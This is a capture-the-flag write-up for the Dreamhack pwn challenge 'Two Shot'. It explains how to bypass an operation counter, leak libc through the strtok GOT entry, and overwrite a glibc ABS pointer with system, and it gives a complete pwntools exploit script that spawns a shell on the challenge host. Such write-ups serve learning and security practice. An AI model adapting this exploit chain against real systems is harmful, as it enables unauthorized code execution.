# Two Shot – Dreamhack (Pwn Lv-5)

**Author:** Dandelion  

---

## Protections
| RELRO | Canary | NX  | PIE |
|-------|--------|-----|-----|
| Full  | Yes    | On  | Off |

---

## Vulnerability Summary
The challenge provides only **two chances** to perform either arbitrary read or arbitrary write.  
After the two operations, the program terminates.  

Interesting quirks:
- The **first input** is handled relative to `rbp`.  
- Later inputs are handled relative to `rsp`.  
- The **stack canary** is also checked against the `rsp` region (not `rbp` as usual).  

The program maintains a counter at an address stored in `rbx`.  
This counter increments with each use of read/write and forces termination when it reaches `2`.  

By leaking memory around `0x402000`, it became clear that the counter resides inside the `ld` mapped region.

---

## Exploitation Strategy
1. **Bypass operation limit**  
   Leak the `ld` base, compute the address of the counter, and overwrite it with `0x30`.  
   This bypassed the two-operation restriction (not strictly required).  

2. **Leak libc**  
   Leak the `strtok@GOT` entry and calculate libc base.  

3. **ABS pointer overwrite**  
   Instead of traditional return address overwrite (blocked by stack canary and a `syscall 60` exit before returning),  
   the exploit targets the **ABS pointer**. On Ubuntu 22.04 this trick is still viable.  
   `strtok@ABS` was overwritten with the address of `system`.  

4. **Trigger `system("/bin/sh")`**  
   Since `strtok` receives its argument in `rdi` from `[rbp]`, sending `"/bin/sh"` directly triggers `system("/bin/sh")`.  

---

## Exploit Code
```python
from pwn import *

p = remote('host8.dreamhack.games', 23207)
# p = process('./prob', env={'LD_PRELOAD': './libc.so.6'})
libc = ELF('./libc.so.6')
elf = ELF('./prob')

l_addr = 0x403e98
strtok_got = elf.got['strtok']

def write(size, addr, data):
    p.sendafter(b': ', b'1')
    p.sendafter(b': ', p16(size))
    p.sendafter(b': ', p64(addr))
    p.sendafter(b': ', data)

def read(addr):
    p.sendafter(b': ', b'2')
    p.sendafter(b': ', p64(addr))

# Leak ld base
read(l_addr)
p.recvuntil(b': ')
ld_base = u64(p.recvn(8)) - 0x3b118
count = ld_base + 0x37000

# Bypass counter limit
write(0x8, count, b'\x30')

# Leak libc
read(strtok_got)
p.recvuntil(b': ')
lb = u64(p.recvn(8)) - libc.symbols['strtok']
system = lb + libc.symbols['system']
strtok_ABS = lb + 0x219058

# Overwrite ABS pointer
write(0x8, strtok_ABS, p64(system))

# Trigger system("/bin/sh")
p.send(b'/bin/sh')
p.interactive()






